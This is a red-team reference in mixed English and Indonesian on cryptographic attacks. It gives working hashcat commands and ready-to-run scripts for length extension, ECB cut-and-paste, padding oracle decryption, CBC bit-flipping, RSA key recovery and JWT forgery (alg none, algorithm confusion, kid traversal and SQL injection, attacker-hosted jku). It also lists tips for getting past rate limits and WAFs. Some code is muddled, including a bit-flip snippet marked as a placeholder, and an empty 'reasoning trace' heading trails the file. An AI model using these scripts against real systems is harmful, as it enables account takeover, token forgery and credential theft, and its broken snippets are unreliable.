# crypto-attacks — crypto

# Cryptography Attacks — Red Team Reference

## 1. Hash Cracking (Hashcat)

### 1.1 Mode Penting

| Mode | Hash | Example |
|------|------|--------|
| 0 | MD5 | `8743b52063cd84097a65d1633f5c74f5` |
| 100 | SHA1 | `3bc15c8aae3e4124dd409035f32ea2fd6835efc9` |
| 1400 | SHA256 | `5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8` |
| 1700 | SHA512 | `b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86` |
| 1000 | NTLM | `8846f7eaee8fb117ad06bdd830b7586c` |
| 3000 | LM | `299bd128c1101fd6` |
| 1800 | sha512crypt `$6$` | — |
| 500 | md5crypt `$1$` | — |
| 3200 | bcrypt `$2a$/$2b$/$2y$` | — |
| 22000 | WPA-PBKDF2-PMKID+EAPOL | `.hc22000` |
| 13100 | Kerberoast (TGS-REP, RC4) | — |
| 18200 | AS-REP Roast | — |
| 7500 | Kerberos AS-REQ pre-auth (etype 23) | — |
| 1600 | Apache `$apr1$` | — |
| 400 | phpBB3 / WordPress phpass | — |
| 2200 | Django (PBKDF2-SHA256) | — |
| 23400 | BitLocker | — |
| 13400 | KeePass | — |
| 12500 | RAR3-hp | — |

### 1.2 Basic Commands

```bash
# Salt + wordlist
hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -O -w 3

# Rule-based mangling (best64 umum; dive lebih agresif)
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule

# Combinator (dua wordlist)
hashcat -m 0 -a 1 md5.txt words1.txt words2.txt -j '$-' -k '$2024'

# Mask (brute force terstruktur)
hashcat -m 0 -a 3 md5.txt '?u?l?l?l?l?d?d?d?s'           # 8 char + digit + symbol
hashcat -m 0 -a 3 md5.txt '?u?l?l?l?l?l?d?d?d?d' -i --increment-min=6

# Hybrid (wordlist + mask)
hashcat -m 1000 -a 6 ntlm.txt rockyou.txt '?d?d?d?d'

# Tuning GPU vs memory
hashcat -m 22000 -a 0 capture.hc22000 rockyou.txt -D 1,2 -w 4 --kernel-accel=128 --kernel-loops=1024

# Restore / status
hashcat --session=red1 --restore
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt --status --status-timer=10 --potfile-disable
```

### 1.3 Mask Charset

```
?l a-z   ?u A-Z   ?d 0-9   ?s !"#$...  ?a ?l?u?d?s   ?b 0x00-0xff
-c  ?l?u  -1 ?l?d   custom set
```

Example NTLM mask with prefix `P@ss`:
```bash
hashcat -m 1000 -a 3 ntlm.txt -1 '?l?d' 'P@ss?1?1?1?1'
```

### 1.4 When it fails
- Bcrypt `$2b$` cost ≥ 12: 100× slower — use rule + wordlist, not mask.
- Hash only (without salt digest/LM): ensure `hashid -m` matches; wrong mode = 0 results.
- GPU thermal throttle: monitor `nvidia-smi dmon`; `-w 4` can trigger throttle and be slower than `-w 3`.
- Hashcat 7.1.2 defaults to OpenCL runtime — on NVIDIA 550+ drivers install `hashcat` via distro package with CUDA backend.

---

## 2. Length Extension Attack

**What is sent:** `hash(secret || message)` (Merkle–Damgård: MD5, SHA1, SHA256, SHA512) + `message || padding || attacker_appendix`.
**What appears:** valid MAC for the extended message.
**Why it works:** internal state after hashing = hash output; attacker can continue from that state.

### Deteksi
- Parameterization such as `?user=admin&role=user&sig=...` where `sig = md5(secret + query)`.
- API signature header (routing, payment gateway) berbasis HMAC palsu.

### Skrip (Python 3.11 + `hashpumpy` / `hlextend`)

```python
# pip install hlextend
import hlextend
sha = hlextend.new('sha256')
original = b'user=guest&role=user'
sig = 'a1b2c3...'                              # dari target
# append '&role=admin'
new_msg, new_sig = sha.extend(b'&role=admin', original, 8, sig)  # keylen=8 (brute 1-32)
print(new_msg.hex(), new_sig)
```

Curl to endpoint:
```bash
curl -s "https://target/api/data?$(python3 -c "print(bytes.fromhex('<hex>').decode('latin1'))")" \
  -H "X-Signature: <new_sig>"
```

Alternative tool: `padbuster` mode `-hash`, or `hash_extender`:
```bash
hash_extender --data "user=guest&role=user" --secret-min=1 --secret-max=32 \
  --append "&role=admin" --signature a1b2c3... --format sha256
```

### When it fails
- Target uses HMAC (SHA256-HMAC): length extension **does not apply**.
- WAF framework (Cloudflare) normalizes `\x80` — payload must be sent as raw bytes (curl `--data-binary`, not `-d`).
- Secret is not prepended (e.g. `hash(msg + secret)`) — use another attack.

---

## 3. ECB Cut-and-Paste

**What is sent:** ECB block ciphertext rearranged from other valid blocks (no key needed).
**What appears:** recombined plaintext.
**Why it works:** ECB encrypts each identical block → identical blocks produce identical ciphertext; easy to "tear apart" per 16 bytes.

### Deteksi
- Ciphertext terlihat sebagai hex panjang (kelipatan 16), biasanya via cookie/base64.
- Enkripsi ECB: blok plaintext berulang → blok ciphertext berulang.

```python
# Deteksi ECB oracle
def is_ecb(oracle):
    ct = oracle(b'A' * 48)
    blocks = [ct[i:i+16] for i in range(0, len(ct), 16)]
    return len(blocks) != len(set(blocks))
```

### Skrip (cookie `user=<x>&role=user` dienkripsi AES-ECB)

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import requests

def oracle(pt: bytes) -> bytes:                     # endpoint proxy
    return bytes.fromhex(requests.get(f'http://t/?inp={pt.hex()}').text)

BS = 16
# Blok A: "AAAAAAA A&role=us er......" → siapkan offset agar "role=user" jatuh di blok penuh
# Blok B: dapatkan ciphertext "admin" dengan injection offset
target = b'role=admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b'  # PKCS7 pad
# cari dengan offset shift 1..15 sampai blok (16-byte) target muncul sendiri
```

Common practice via `padbuster` or `ecb_tool`:
```bash
# ecb_oracle (matasano set 2 chall 12-14) — baca password via oracle
python3 ecb_oracle.py --url https://t/?inp= --block 16 --prefix 0
```

### When it fails
- Server uses AES-CBC + random IV or GCM: attack does not apply.
- Name/value sanitizer blocks `&` before encryption (invalidates recombination).
- Ciphertext has an HMAC outside the block — cut-and-paste fails because the auth tag changes.

---

## 4. Padding Oracle (CBC)

**What is sent:** ciphertext with one byte of the previous block modified; measure different responses between 200/500 or different timing.
**What appears:** final plaintext one byte per request, iteratively → full decrypt + forge.
**Why it works:** CBC decrypt = `P_i = D(C_i) ⊕ C_{i-1}`; changing C_{i-1} affects P_i; server reveals invalid vs valid padding.

### Payload template (curl probe)

```bash
CT=...                                   # hex/base64 dari cookie
PT_BLOCK=$((16*${BLOCK_IDX}))
# Modify byte ke-i di blok C_{i-1}
python3 - <<'PY'
import base64
ct = bytearray(base64.b64decode("<ct>"))
ct[15] ^= 0x01                             # ubah byte terakhir blok sebelumnya
print(base64.b64encode(ct).decode())
PY
```

### `padbuster` script (most practical way)

```bash
padbuster https://target/profile "vQ7bKeY7nR5t..." 16 \
  -cookies "auth=vQ7bKeY7nR5t...; lang=en" \
  -encoding 0 -error "Invalid padding" -plaintext "user=guest"
```

### Skrip Python (oracle beda status/timing)

```python
import requests, base64
URL = 'https://target/profile'
CT  = base64.b64decode('<cipher>').hex()
BS  = 16

def oracle(ct_hex):
    r = requests.post(URL, data={'cipher': ct_hex})
    return r.status_code != 500   # True = padding valid

def decrypt(ct_hex):
    ct = bytearray.fromhex(ct_hex)
    blocks = [ct[i:i+BS] for i in range(0, len(ct), BS)]
    pt = b''
    for i in range(len(blocks)-1, 0, -1):
        prev = bytearray(blocks[i-1])
        dec = bytearray(BS)
        inter = bytearray(BS)
        for pad in range(1, BS+1):
            for guess in range(256):
                prev[BS-pad] = (inter[BS-pad] ^ pad) ^ guess
                test = bytes(prev) + bytes(blocks[i])
                if oracle(test.hex()):
                    inter[BS-pad] = guess ^ pad
                    break
            for j in range(BS-pad, BS):
                prev[j] = inter[j] ^ (pad+1)
        pt = bytes(a ^ b for a, b in zip(inter, blocks[i-1])) + pt
    return pt
```

### When it fails
- Server already uses **Encrypt-then-MAC** or AEAD (GCM/ChaCha20-Poly1305) → no padding oracle.
- Constant-time response + 500 for all errors (WAF normalizes errors).
- HTTP/2 + `nginx 1.25` limits number of parallel requests; padbuster default parallelism 10 can reset — use `-parallelism 1` + delay.
- CT byte has HMAC at the end (double-submit) → cannot forge without key.

---

## 5. CBC Bit Flipping

**What is sent:** `C_{i-1} ^= delta` to change `P_i` without knowing the key.
**What appears:** target plaintext from block P_i, corrupting P_{i-1} (garbage).
**Why it works:** CBC: `P_i = D(C_i) ⊕ C_{i-1}` — manipulating C_{i-1} directly XORs into plaintext of block i.

### Classic case: cookie `role=user` → `role=admin`

```python
import base64
ct = bytearray(base64.b64decode('<cookie_ct>'))
# Plaintext block 1: b'...role=user.....', target role=admin
# delta = b'user' XOR b'min\x00' untuk 4 byte di posisi role
orig  = b'user'
new   = b'admin'[:4]                                  # 'admi' vs 'user' panjang beda → geser
# Untuk awal "user" → "admi" — tidak akan match string role=, gunakan flip posisi dgn padding
# Baseline hitung delta jika panjang tetap:
delta = bytes(a ^ b for a, b in zip(b'user', b'adm%')) # placeholder
```

Concrete example fixed length `role=user` (9 bytes) → `role=admi` + junk byte (original padding if server does not check `role=` prefix):

```python
block_target = 1                         # indeks blok plaintext yang ditargetkan
offset = 5                               # posisi dalam blok
delta = bytes([ord('u')^ord('a'), ord('s')^ord('d'), ord('e')^ord('m'), ord('r')^ord('i')])
for i, d in enumerate(delta):
    ct[(block_target-1)*16 + offset + i] ^= d
print(base64.b64encode(ct).decode())
```

### When it fails
- Authenticated IV (HMAC) → flip breaks MAC.
- Server validates `role` with an allowlist after decrypt but before auth-check? Not possible: role is the deserialize target — validation is usually in two places; if two places → also need to flip the auth block (via oracle).
- Length `user` ≠ `admin` without modulo 16 padding: needs padding oracle (see §4).
- Encoding cookie (URL-safe base64 vs standar) → decode salah. Cek `%3D`, `-`, `_`.

---

## 6. RSA Attacks

### 6.1 Common Modulus

**Sent:** two ciphertexts to public key (n, e1) and (n, e2), with gcd(e1,e2)=1.
**Muncul:** plaintext m asli via Bézout.
**Why it works:** `m^{a·e1 + b·e2} = m` if `a·e1 + b·e2 = 1`.

```python
from math import gcd
def egcd(a,b):
    if b==0: return (a,1,0)
    g,x1,y1 = egcd(b, a%b); return (g, y1, x1-(a//b)*y1)
def common_modulus(n, e1, c1, e2, c2):
    g, a, b = egcd(e1, e2); assert g == 1
    def inv(x, m): return pow(x, -1, m)
    if a < 0: c1 = inv(c1, n); a = -a
    if b < 0: c2 = inv(c2, n); b = -b
    return (pow(c1, a, n) * pow(c2, b, n)) % n
```

### 6.2 Wiener (small d)

**Sent:** public (n, e) → factor n.
**Muncul:** d bila `d < n^{0.25}/3`.
**Why it works:** convergents of e/n yield k/d.

```python
# pip install owiener
import owiener
d = owiener.attack(e, n)
m = pow(c, d, n)
print(bytes.fromhex(hex(m)[2:]))
```

### 6.3 Hastad Broadcast (small e, no padding)

**Sent:** ciphertexts from ≥ e different keys, co-prime moduli, same message.
**Appears:** CRT reconstructs `m^e`, e-th root.
**Why it works:** `m^e < Π n_i` → exact integer root.

```python
from sympy.ntheory.modular import crt
from gmpy2 import iroot
ns = [n1, n2, n3]; cs = [c1, c2, c3]
m_e, _ = crt(ns, cs)
m, exact = iroot(int(m_e), 3)
assert exact
print(bytes.fromhex(hex(int(m))[2:]))
```

### 6.4 Shared Prime (batch GCD)

**Dikirim:** dua public key RSA `n1, n2`.
**Appears:** factor `p = gcd(n1, n2)` if PRNG weak/reused.
**Why it works:** moduli share a prime factor.

```python
from math import gcd
def shared_prime(n1, n2):
    p = gcd(n1, n2)
    if p == 1: return None
    return p, n1//p, n2//p
```

Batch (data dump sertifikat):
```bash
# tool: RsaCtfTool (crypto-attacks), atau badkeys
badkeys --update-bl
badkeys -a scan pubkey.pem
```

RsaCtfTool one-stop:
```bash
# install: git clone https://github.com/RsaCtfTool/RsaCtfTool
python3 RsaCtfTool.py --publickey pub.pem --private
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile ct.bin --attack wiener
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile ct.bin --attack common_modulus \
  --cm-publickey2 pub2.pem --cm-cipherfile2 ct2.bin
```

### When it fails
- Padding (OAEP/PKCS#1 v1.5) aktif: Hastad butuh kosong; OAEP melawannya (randomisasi).
- Large `e` (≥ 65537) with OK padding: Wiener, Hastad do not apply.
- Factorization only when `n1 ∩ n2 > 1` — usually from embedded firmware generators (router, IoT).
- RsaCtfTool needs SageMath for many attacks; without Sage → many attacks silently fail. Check `which sage`.

---

## 7. JWT Crypto Abuse

### 7.1 `alg: none`

**Sent:** JWT with header `{"alg":"none"}` + empty signature.
**Appears:** server that does not enforce alg → accepts token without verification.
**Why it works:** old library / config accepts `none`.

```bash
python3 - <<'PY'
import base64, json
h = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
p = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).rstrip(b'=')
print((h+b'.'+p+b'.').decode())
PY
```

Case variations: `None`, `NONE`, `nOnE` (old CVE-2015-9235 in `jsonwebtoken` npm < 4.2.2).

### 7.2 Algorithm Confusion RS256 → HS256

**Sent:** header `{"alg":"HS256"}`, signature computed with **RSA public key as HMAC secret** (PEM).
**Appears:** server verifies HMAC with public key → valid.
**Why it works:** `jsonwebtoken` (node) < 9 / `pyjwt` < 2.4 library without explicit `algorithms=["RS256"]`; verifier uses the same secret as the verifier for the claimed algorithm.

```python
# pip install pyjwt cryptography
import jwt, requests
pubkey = requests.get('https://target/.well-known/jwks.json').json()   # atau /jwks.json
# konversi JWK → PEM (pakai jwcrypto)
from jwcrypto import jwk
k = jwk.JWK(**pubkey['keys'][0]); pem = k.export_to_pem()
token = jwt.encode({"sub":"admin","role":"admin"},
                   pem, algorithm="HS256")
print(token)
```

Also compare public key in PEM vs `-----BEGIN PUBLIC KEY-----` (pyjwt uses raw bytes, node uses pem string — try both formats).

### 7.3 `kid` Injection

**Sent:** header `{" kid":"../../../../dev/null" }` or `{"kid":"/etc/passwd"}`.
**Occurs:** server opens file path ↔ secret = contents; if empty → secret = "" (HMAC forgeable).

```python
# kid = /dev/null → HMAC secret string kosong
import hmac, hashlib, base64, json
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=')
h = b64(json.dumps({"alg":"HS256","kid":"/dev/null"}).encode())
p = b64(json.dumps({"sub":"admin"}).encode())
sig = b64(hmac.new(b'', f'{h.decode()}.{p.decode()}'.encode(), hashlib.sha256).digest())
print(f"{h.decode()}.{p.decode()}.{sig.decode()}")
```

SQLi kid variation: `kid: "x' UNION SELECT 'secret'--"` in the backend that fetches the key from the DB.

### 7.4 JWKS Injection / SSRF via `jku`, `x5u`

**Dikirim:** header `{"jku":"https://attacker/jwks.json","alg":"RS256"}`.
**Occurs:** server fetches JWKS from attacker URL → verifies token with attacker key.
**Why it succeeds:** no allowlist for host `jku`.

```bash
# 1) Host jwks.json di attacker (attacker key pair)
openssl genrsa -out atk.pem 2048
openssl rsa -in atk.pem -pubout -out atk.pub
python3 - <<'PY'
import json, base64
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.primitives.asymmetric import rsa
import base64
pub = load_pem_public_key(open('atk.pub','rb').read())
nums = pub.public_numbers()
def b64u(i): 
    b = i.to_bytes((i.bit_length()+7)//8,'big'); return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
print(json.dumps({"keys":[{"kty":"RSA","n":b64u(nums.n),"e":b64u(nums.e),"kid":"atk"}]}))
PY
# 2) Sign token dengan atk.pem + header jku ke URL di atas
```

### 7.5 Weak HMAC Secret (jwt-cracker)

```bash
# pip install pyjwt; pakai hashcat: mode 16500 (JWT HS256)
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt

# jwt_tool (opsional, python)
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt
# Setelah crack:
python3 jwt_tool.py <token> -T -S hs256 -p '<secret>'
```

### When it fails
- `algorithms=["RS256"]` hardcoded → node `jsonwebtoken` ≥ 9, pyjwt ≥ 2.4 is safe from confusion.
- `kid` path traversal is blocked by `os.path.basename` or key id allowlist map.
- `jku`/`x5u` are strictly allowlisted in the API gateway (Kong 3.6+, AWS API Gateway default does not fetch).
- Keycloak 24.x, Auth0 default rules already verify `keys` server-side against pinned JWKS; `jku` is ignored.
- Incorrect base64 signature decode: JWT uses `-` `_` (URL-safe), not `+` `/`; `str.replace('=','')` is mandatory.

---

## 8. Operational Traps (that cause attacks to fail in the field)

1. **Encoding mismatch** — length extension & CBC flip most often fail because the target URL-decodes `%80`/NUL, or `curl -d` changes `+` → space. Send `--data-binary` and `Content-Type: application/octet-stream`.
2. **WAF normalization** — Cloudflare/Akamai normalize whitespace, trailing bytes, and base64. Binary payload must pass through `POST` body or raw header; GET query string will corrupt.
3. **Rate limit per-IP** — padding oracle requires thousands of requests; use IP rotator or `--delay`; nginx 1.25 `limit_req` default will return 429 at 10 rps.
4. **HTTP/2 stream** — padbuster v1.2 (old) does not handle h2; use `--load-balancer` or `-H "Connection: close"` for downgrade.
5. **Cookie SameSite/Host** — CBC/JWT abuse on cookies with `SameSite=Strict` can still be serialized via browser devtools, but rotation of the `__Host-` prefix requires an exact `Path=/` match.
6. **Time skew in JWT** — `exp` is not forged; if the token is rejected, check `iat`/`nbf`; targets with NTP drift > 30s (common in Windows 11 24H2 without time sync) can unexpectedly reject or accept.
7. **Hashcat driver drift** — hashcat 7.x on ROCm 6.1 has a regression for `-m 22000`; downgrade to hashcat 6.2.6 or compile OpenCL. Check `hashcat -I` for detected devices.
8. **GPU memory OOM** — mask `?a?a?a?a?a?a?a?a` requires > 24 GB VRAM after workload; hashcat will be "out of memory" but not crash — check `--status` shows 0 H/s (silent). Use `-d 1` per device or reduce `-n`.
9. **Crypto library version** — pyjwt < 2.4 is vulnerable to confusion; the target might be updatable. Check `Server:`, verbose error (`jwt.exceptions.InvalidAlgorithmError`) for version fingerprinting.
10. **RSA padding identity** — RSA-CTF tool "wiener" succeeds only if `d` is small. If the key is 2048-bit with d equivalent to the modulus, the silent attack is completely lost. Check for eccentric `e` (`e=3` — Hastad candidate, `e=1` — m=c).
11. **JWT jku** — attacker's jwks endpoint must be HTTPS with a valid certificate; Node backend `node-fetch` rejects self-signed. Prepare Let's Encrypt (or via `ngrok`/`cloudflared` but the public domain must be resolved).
12. **JWT header `crit`** — some libraries reject headers with unknown `crit` → token is rejected before verification. Strip `crit` during forging.
13. **Brute force wordlist incorrect salt** — kerberoast mode 13100 fails if the ticket uses AES (etype 17/18). Detect via `--example-hashes`; replace `-m 19600`/`19700` + adaptive wordlist.
14. **Length extension in signed query-string requests**: strings are sorted alphabetically by the framework (Spring `UriComponentsBuilder`), so appending at the end will be re-sorted — the payload must be inserted into a parameter that is also an injection point (`&role=admin` in a position that is not re-sorted, e.g., fragment or body).
15. **Padding oracle multi-stack** — TLS offload (nginx) can respond with a 400 error before the application (padding) → oracle is lost. Test first with definitely invalid corrupt bytes, see if the response differs at the TLS layer.
16. **ECB cut-and-paste in JSON serializer** — many backends add random fields between blobs, so plaintext blocks are not aligned with 16 bytes. Add the prefix `A * (16 - offset)` per request — without it, the ciphertext will shift by 1 byte and the test will always mismatch.

---

## [reasoning trace]


